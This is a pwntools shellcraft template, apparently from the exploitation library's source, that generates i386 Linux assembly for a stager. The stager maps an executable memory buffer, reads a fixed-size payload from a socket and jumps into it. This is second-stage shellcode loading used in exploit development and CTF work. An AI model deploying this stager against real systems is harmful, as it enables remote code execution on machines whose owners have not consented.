<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft import i386 %>
<% from pwnlib.shellcraft.i386 import linux %>
<%docstring>
Recives a fixed sized payload into a mmaped buffer
Useful in conjuncion with findpeer.
Args:
    sock, the socket to read the payload from.
    size, the size of the payload
</%docstring>
<%page args="sock, size"/>

<%
    stager = common.label("stager")
    mmap = common.label("mmap")
    looplabel = common.label("loop")
    errlabel = common.label("error")
%>

${stager}:
    push ${sock}
    xor eax, eax
    mov al, SYS_mmap2
    xor ebx, ebx
    ${i386.mov("ecx", size)}
    push ecx
    xor edx, edx
    mov dl, 7
    push 0x22
    pop esi
    xor edi, edi
    dec edi
    xor ebp, ebp
    int 0x80
    push eax

    pop ecx
    pop edx
    pop ebx
    push ecx

${looplabel}:
    xor eax, eax
    mov al, SYS_read
    int 0x80
    test eax, eax
    js ${errlabel}
    sub edx, eax
    add ecx, eax
    test edx, edx
    jne ${looplabel}

    pop eax
    push ebx
    call eax

${errlabel}:
    hlt
